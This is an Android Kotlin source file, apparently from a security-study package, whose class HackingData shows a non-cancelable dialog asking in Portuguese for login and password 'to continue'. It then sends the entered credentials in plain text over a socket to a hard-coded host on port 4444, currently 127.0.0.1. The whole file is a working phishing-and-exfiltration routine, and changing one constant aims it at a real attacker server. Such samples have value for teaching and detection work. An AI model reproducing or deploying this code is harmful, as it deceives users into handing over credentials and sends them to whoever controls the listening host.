package com.study.sec.android

import android.app.AlertDialog
import android.content.Context
import android.text.InputType
import android.view.ViewGroup
import android.view.ViewGroup.LayoutParams.MATCH_PARENT
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT
import android.widget.EditText
import android.widget.LinearLayout
import java.net.InetSocketAddress
import java.net.Socket
import kotlin.concurrent.thread

private const val REMOTE_HOST = "127.0.0.1"
private const val REMOTE_PORT = 4444

class HackingData(context: Context) {

    init {
        val dialogView = LinearLayout(context)
            .apply {
                layoutParams = ViewGroup.LayoutParams(MATCH_PARENT, WRAP_CONTENT)
                orientation = LinearLayout.VERTICAL
            }

        val login = EditText(context).apply {
            hint = "Login"
            layoutParams = ViewGroup.LayoutParams(MATCH_PARENT, WRAP_CONTENT)
        }

        val password = EditText(context).apply {
            hint = "Senha"
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            layoutParams = ViewGroup.LayoutParams(MATCH_PARENT, WRAP_CONTENT)
        }

        with(dialogView) {
            addView(login)
            addView(password)
        }

        AlertDialog.Builder(context)
            .setTitle("Precisamos das suas credenciais para continuar")
            .setView(dialogView)
            .setNeutralButton("Continuar") { _, _ ->
                sendData(login.text.toString(), password.text.toString())
            }
            .setCancelable(false)
            .create()
            .show()
    }

    private fun sendData(login: String, pass: String) = thread {
        val socket = Socket().apply {
            connect(InetSocketAddress(REMOTE_HOST, REMOTE_PORT))
        }

        socket.getOutputStream().use { os ->
            os.write("[Login]: $login | [Password]: $pass".toByteArray())
            os.flush()
        }

        socket.close()
    }
}